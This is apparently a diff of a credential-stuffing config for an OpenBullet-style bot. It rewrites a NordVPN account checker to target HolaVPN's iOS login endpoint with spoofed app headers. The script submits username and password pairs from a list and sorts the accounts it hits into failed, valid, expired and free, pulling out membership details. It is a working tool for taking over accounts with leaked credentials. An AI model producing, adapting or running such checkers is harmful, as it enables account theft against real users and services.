@@ -1,9 +1,9 @@
 [SETTINGS]
 {
-  "Name": "NordVPN API",
-  "SuggestedBots": 120,
+  "Name": "HolaVPN",
+  "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-09-04T15:44:59.4235506+04:30",
+  "LastModified": "2020-09-04T16:23:17.8381348+04:30",
   "AdditionalInfo": "",
   "Author": "@TheOwn",
   "Version": "1.4.4 [Anomaly]",
@@ -50,43 +50,30 @@
 }
 
 [SCRIPT]
-#POST REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
-  CONTENT "password=<PASS>&username=<USER>" 
+#P REQUEST POST "https://client.hola.org/client_cgi/ios/login" 
+  CONTENT "email=<USER>&password=<PASS>" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
-  HEADER "Host: zwyr157wwiu6eior.com" 
+  HEADER "Host: client.hola.org" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
   HEADER "Connection: keep-alive" 
+  HEADER "X-Hola-Version: 2.12" 
   HEADER "Accept: */*" 
-  HEADER "User-Agent: NordApp iOS (applestore/5.0.5) iOS/13.3.1" 
-  HEADER "Content-Length: 51" 
-  HEADER "Accept-Language: en-us" 
-  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)" 
+  HEADER "Accept-Language: fr-FR;q=1, ar-FR;q=0.9, en-GB;q=0.8, ja-JP;q=0.7, vi-VN;q=0.6, sr-Latn-FR;q=0.5" 
+  HEADER "Content-Length: 43" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
 
 KEYCHECK 
   KEYCHAIN Failure OR 
-    KEY "\"Unauthorized\"" 
+    KEY "Unauthorized" 
   KEYCHAIN Success OR 
-    KEY "\"token\"" 
-  KEYCHAIN Ban OR 
-    KEY "429 Too Many Requests" 
-
-#TOKEN PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "TOKEN" 
-
-#TOKENS FUNCTION Base64Encode "token:<TOKEN>" -> VAR "TOKENS" 
-
-#GET_CAP REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
-  
-  HEADER "User-Agent: NordApp iOS (applestore/5.0.5) iOS/13.3.1" 
-  HEADER "Authorization: Basic <TOKENS>" 
-
-#EXP PARSE "<SOURCE>" LR "\"expires_at\":\"" "\"," CreateEmpty=FALSE -> CAP "Expire" 
-
-#EX FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expire>" -> VAR "ExpireDate" 
-
-#DD FUNCTION CurrentUnixTime -> VAR "Date" 
-
-KEYCHECK 
+    KEY "token" 
   KEYCHAIN Custom "EXPIRED" OR 
-    KEY "<Date>" GreaterThan "<ExpireDate>" 
-  KEYCHAIN Success OR 
-    KEY "<ExpireDate>" GreaterThan "<Date>" 
+    KEY "Precondition Failed" 
+
+PARSE "<SOURCE>" LR "membership\":" "},\"" -> CAP "membership" "" "}" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "trial\":false,\"active\":false" 
 
